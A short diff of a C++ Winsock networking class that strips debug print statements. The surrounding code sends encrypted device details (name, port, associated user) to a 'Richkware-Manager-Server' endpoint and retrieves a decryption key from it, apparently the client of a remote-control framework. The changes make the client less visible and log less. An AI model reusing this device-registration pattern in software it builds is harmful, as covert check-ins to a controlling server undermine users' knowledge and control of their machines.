@@ -63,8 +63,7 @@ std::string Network::RawRequest(const std::string &serverAddress, const std::str
     int iResult;
     std::string response;
 
-    //TODO REMOVE
-    std::cout << "RawRequest:" << serverAddress << " " << port << " " << request << std::endl;
+    // std::cout << "RawRequest:" << serverAddress << " " << port << " " << request << std::endl;
 
     // Initialize Winsock
     iResult = WSAStartup(MAKEWORD(2, 2), &wsaData);
@@ -169,8 +168,6 @@ Network::UploadInfoToRMS(const std::string &serverAddress, const std::string &po
     //std::string deviceStr = "$" + device.getName() + "," + device.getServerPort() + "$";
 
     std::string associatedUserS = crypto.Encrypt(associatedUser);
-    // TODO REMOVE
-    std::cout << "associatedUser: " << associatedUser << " " << associatedUserS << std::endl;
 
     std::string packet = "PUT /Richkware-Manager-Server/device?data0=" + name +
                          "&data1=" + serverPortS +
@@ -215,7 +212,7 @@ std::string Network::GetEncryptionKeyFromRMS(const std::string &serverAddress, c
         key = key.substr(key.find('$') + 1, (key.find('#') - key.find('$')) - 1);
         key = crypto.Decrypt(key);
     }
-    //TODO server error: key not received
+
     return key;
 }
 
